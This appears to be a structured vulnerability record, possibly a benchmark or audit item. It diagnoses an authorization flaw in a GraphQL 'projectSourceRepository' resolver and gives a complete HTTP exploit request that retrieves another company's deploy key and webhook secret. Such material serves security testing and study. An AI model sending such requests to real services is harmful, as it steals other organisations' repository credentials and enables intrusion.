diagnosis: The ProjectSourceRepository GraphQL resolver returns Git repository details, including deploy keys and webhook secrets, based solely on the repoID argument. Any authenticated platform user can query internal source repository credentials for repositories belonging to other companies.
exploit_request:
POST /graphql HTTP/1.1
Host: gitops.developer-cloud.net
Authorization: Bearer dev_user_token_33
Content-Type: application/json

{"query": "query { projectSourceRepository(repoId: \"repo_corp_internal_44\") { id gitUrl deployKey webhookSecret } }"}
